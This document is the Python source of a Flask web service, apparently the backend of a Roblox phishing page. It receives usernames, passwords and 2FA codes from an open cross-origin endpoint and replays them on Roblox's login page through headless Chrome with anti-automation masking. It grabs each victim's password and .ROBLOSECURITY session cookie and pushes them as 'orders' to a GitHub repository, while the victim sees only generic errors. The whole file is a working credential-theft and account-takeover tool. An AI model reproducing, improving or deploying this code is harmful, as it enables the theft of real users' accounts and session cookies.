import os
import logging
import random
import string
import time
from datetime import datetime
from flask import Flask, request, jsonify
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from selenium.common.exceptions import (WebDriverException, TimeoutException, 
                                      NoSuchElementException)
import git
import json
from flask_cors import CORS
import subprocess

app = Flask(__name__)
CORS(app)

# Конфигурация
ORDERS_REPO = f"https://github.com/{os.getenv('GITHUB_USERNAME')}/base.git"
ORDERS_DIR = "orders"
SCREENSHOT_DIR = "screenshots"
MAX_LOGIN_ATTEMPTS = 3
REQUEST_TIMEOUT = 30

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler("bot.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

def install_chrome():
    """Установка Chrome если не обнаружен"""
    try:
        # Проверяем доступные пути
        chrome_paths = [
            "/usr/bin/google-chrome",
            "/usr/bin/google-chrome-stable",
            "/usr/bin/chromium",
            "/usr/bin/chromium-browser"
        ]
        
        if any(os.path.exists(path) for path in chrome_paths):
            return True
            
        # Если Chrome не найден - устанавливаем
        logger.info("Installing Google Chrome...")
        os.system('apt-get update')
        os.system('wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | apt-key add -')
        os.system('echo "deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main" >> /etc/apt/sources.list.d/google.list')
        os.system('apt-get update')
        os.system('apt-get install -y google-chrome-stable')
        return True
        
    except Exception as e:
        logger.error(f"Failed to install Chrome: {str(e)}")
        return False

def generate_filename():
    """Генерирует имя файла"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    rand_str = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    return f"account_{timestamp}_{rand_str}.json"

def get_chrome_options():
    """Configure Chrome options that work without Chrome binary"""
    options = Options()
    
    # Essential settings for headless mode
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1920,1080")
    
    # Anti-detection settings
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option("useAutomationExtension", False)
    
    # User-Agent
    options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36")
    
    return options

def init_driver():
    """Initialize ChromeDriver without Chrome binary"""
    try:
        chrome_options = get_chrome_options()
        
        # Force ChromeDriver to work without Chrome binary
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)
        
        # Mask headless detection
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        driver.execute_cdp_cmd("Network.setUserAgentOverride", {
            "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
        })
        
        return driver
        
    except Exception as e:
        logger.error(f"Driver initialization failed: {str(e)}")
        raise Exception("Browser initialization error")

def init_repository():
    """Инициализирует git репозиторий"""
    try:
        if os.path.exists(os.path.join(ORDERS_DIR, '.git')):
            repo = git.Repo(ORDERS_DIR)
            repo.git.pull()
            logger.info("Репозиторий обновлен")
        else:
            if os.path.exists(ORDERS_DIR):
                for item in os.listdir(ORDERS_DIR):
                    if item != '.git':
                        os.remove(os.path.join(ORDERS_DIR, item))
            
            repo_url = f"https://{os.getenv('GITHUB_USERNAME')}:{os.getenv('GITHUB_TOKEN')}@{ORDERS_REPO.split('https://')[1]}"
            git.Repo.clone_from(repo_url, ORDERS_DIR)
            logger.info("Репозиторий клонирован")
        return True
    except Exception as e:
        logger.error(f"Ошибка работы с репозиторием: {str(e)}")
        return False

def save_account_data(data):
    """Сохраняет данные аккаунта"""
    try:
        if not init_repository():
            return False
        
        filename = generate_filename()
        filepath = os.path.join(ORDERS_DIR, filename)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        
        repo = git.Repo(ORDERS_DIR)
        repo.git.add(filepath)
        repo.index.commit(f"Add account {filename}")
        origin = repo.remote(name='origin')
        origin.push()
        
        logger.info(f"Данные сохранены в {filename}")
        return True
    except Exception as e:
        logger.error(f"Ошибка сохранения данных: {str(e)}")
        return False

def human_like_delay(min_sec=0.1, max_sec=0.5):
    """Имитирует человеческую задержку"""
    time.sleep(random.uniform(min_sec, max_sec))

def process_login(username, password, code_2fa=None):
    """Handle login process without Chrome binary"""
    driver = None
    try:
        # Initialize driver
        try:
            driver = init_driver()
        except Exception as e:
            logger.error(f"Browser initialization failed: {str(e)}")
            return {'status': 'error', 'message': 'System error. Please try later'}

        # 2. Navigate to login page with retry logic
        max_retries = 2
        for attempt in range(max_retries):
            try:
                driver.get("https://www.roblox.com/login")
                WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.ID, "login-username")))
                break
            except Exception as e:
                if attempt == max_retries - 1:
                    logger.error(f"Failed to load login page after {max_retries} attempts: {str(e)}")
                    return {'status': 'error', 'message': 'Connection error. Please try later'}
                human_like_delay(1, 3)
                continue

        human_like_delay(1, 2)

        # 3. Handle cookies if present
        try:
            cookie_btn = WebDriverWait(driver, 3).until(
                EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Accept')]")))
            cookie_btn.click()
            human_like_delay(0.5, 1.5)
        except:
            pass  # Cookie banner not found is acceptable

        # 4. Fill credentials with error handling
        try:
            username_field = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, "login-username")))
            for char in username:
                username_field.send_keys(char)
                human_like_delay(0.05, 0.1)
            
            password_field = driver.find_element(By.ID, "login-password")
            for char in password:
                password_field.send_keys(char)
                human_like_delay(0.05, 0.1)
                
        except Exception as e:
            logger.error(f"Failed to fill credentials: {str(e)}")
            return {'status': 'error', 'message': 'System error. Please try later'}

        # 5. Submit login form
        try:
            login_btn = driver.find_element(By.ID, "login-button")
            login_btn.click()
            human_like_delay(2, 3)  # Wait for login processing
        except Exception as e:
            logger.error(f"Failed to submit login form: {str(e)}")
            return {'status': 'error', 'message': 'System error. Please try later'}

        # 6. Handle 2FA if required
        if code_2fa:
            try:
                code_field = WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.XPATH, "//input[@name='verificationCode']")))
                for char in code_2fa:
                    code_field.send_keys(char)
                    human_like_delay(0.1, 0.2)
                
                submit_btn = driver.find_element(By.XPATH, "//button[contains(., 'Verify')]")
                submit_btn.click()
                human_like_delay(2, 3)
            except Exception as e:
                logger.error(f"2FA submission failed: {str(e)}")
                return {'status': 'error', 'message': 'Invalid verification code'}
        else:
            # Check if 2FA is required
            try:
                WebDriverWait(driver, 3).until(
                    EC.presence_of_element_located((By.XPATH, "//input[@name='verificationCode']")))
                return {'status': '2fa_required', 'message': '2FA verification required'}
            except TimeoutException:
                pass  # 2FA not required

        # 7. Verify successful login with multiple checks
        try:
            # Check for avatar container (main success indicator)
            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.XPATH, "//div[contains(@class, 'avatar-container')]")))
            
            # Additional verification - check for logout button
            WebDriverWait(driver, 5).until(
                EC.presence_of_element_located((By.XPATH, "//a[contains(@href, 'logout')]")))
            
            # Get account data
            account_data = {
                'username': username,
                'password': password,
                'status': 'active',
                'cookie': driver.get_cookie('.ROBLOSECURITY')['value'] if driver.get_cookie('.ROBLOSECURITY') else None,
                'timestamp': datetime.now().isoformat()
            }
            
            return {'status': 'success', 'data': account_data}
            
        except TimeoutException:
            # Check for specific error messages
            error_msg = check_for_errors(driver)
            if error_msg:
                logger.info(f"Login failed with message: {error_msg}")
                return {'status': 'error', 'message': error_msg}
            
            # Check for captcha
            if "captcha" in driver.page_source.lower():
                logger.error("Captcha detected")
                return {'status': 'error', 'message': 'Security check required'}
            
            logger.error("Login failed without specific error message")
            return {'status': 'error', 'message': 'Login failed. Please try later'}
            
    except Exception as e:
        logger.error(f"Unexpected error during login process: {str(e)}")
        return {'status': 'error', 'message': 'System error. Please try later'}
        
    finally:
        if driver:
            try:
                driver.quit()
            except Exception as e:
                logger.warning(f"Failed to properly close browser: {str(e)}")

def check_for_errors(driver):
    """Check page for known error messages"""
    error_messages = {
        "incorrect username or password": "Invalid credentials",
        "неверное имя пользователя или пароль": "Invalid credentials",
        "account locked": "Account locked",
        "требуется проверка": "Verification required",
        "verification required": "Verification required",
        "too many attempts": "Too many attempts",
        "captcha": "Security check required"
    }
    
    page_text = driver.page_source.lower()
    for msg, display_msg in error_messages.items():
        if msg in page_text:
            return display_msg
    
    return None

@app.route('/')
def home():
    return jsonify({"status": "ok", "message": "Service is running"})

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({'status': 'ok', 'timestamp': datetime.now().isoformat()})

@app.route('/process_login', methods=['POST'])
def handle_login():
    if not request.is_json:
        return jsonify({'status': 'error', 'message': 'Invalid request'}), 400
    
    try:
        data = request.get_json()
    except:
        return jsonify({'status': 'error', 'message': 'Invalid request'}), 400
    
    username = data.get('username')
    password = data.get('password')
    
    if not username or not password:
        return jsonify({'status': 'error', 'message': 'Missing credentials'}), 400
    
    logger.info(f"Processing login for: {username}")
    
    try:
        result = process_login(username, password)
        
        if result['status'] == 'success':
            if not save_account_data(result['data']):
                return jsonify({'status': 'error', 'message': 'Server error. Please try later'}), 500
            return jsonify(result)
        elif result['status'] == '2fa_required':
            return jsonify(result)
        else:
            # Все ошибки преобразуем в общее сообщение
            return jsonify({
                'status': 'error',
                'message': 'Server error. Please try again later'
            })
            
    except Exception as e:
        logger.error(f"Server error: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': 'Server error. Please try again later'
        }), 500

@app.route('/submit_2fa', methods=['POST'])
def handle_2fa():
    if not request.is_json:
        return jsonify({'status': 'error', 'message': 'Invalid request'}), 400
    
    try:
        data = request.get_json()
    except:
        return jsonify({'status': 'error', 'message': 'Invalid request'}), 400
    
    code = data.get('code')
    username = data.get('username')
    password = data.get('password')
    
    if not all([code, username, password]):
        return jsonify({'status': 'error', 'message': 'Missing data'}), 400
    
    logger.info(f"Processing 2FA for: {username}")
    
    try:
        result = process_login(username, password, code)
        
        if result['status'] == 'success':
            if not save_account_data(result['data']):
                return jsonify({'status': 'error', 'message': 'Server error. Please try later'}), 500
            return jsonify(result)
        else:
            # Все ошибки 2FA преобразуем в общее сообщение
            return jsonify({
                'status': 'error',
                'message': 'Verification failed. Please try again'
            })
            
    except Exception as e:
        logger.error(f"Server error: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': 'Server error. Please try again later'
        }), 500

@app.route('/check_chrome')
def check_chrome():
    try:
        options = get_chrome_options()
        return jsonify({
            'status': 'success',
            'chrome_path': options.binary_location,
            'message': 'Chrome is properly configured'
        })
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

if __name__ == '__main__':
    if not install_chrome():
        logger.error("Critical: Chrome installation failed")
        exit(1)
    
    # Verify environment variables
    required_env_vars = ['GITHUB_USERNAME', 'GITHUB_TOKEN']
    for var in required_env_vars:
        if not os.getenv(var):
            logger.error(f"Missing required environment variable: {var}")
            exit(1)
    
    # Create directories
    os.makedirs(ORDERS_DIR, exist_ok=True)
    
    # Start server
    port = int(os.getenv('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
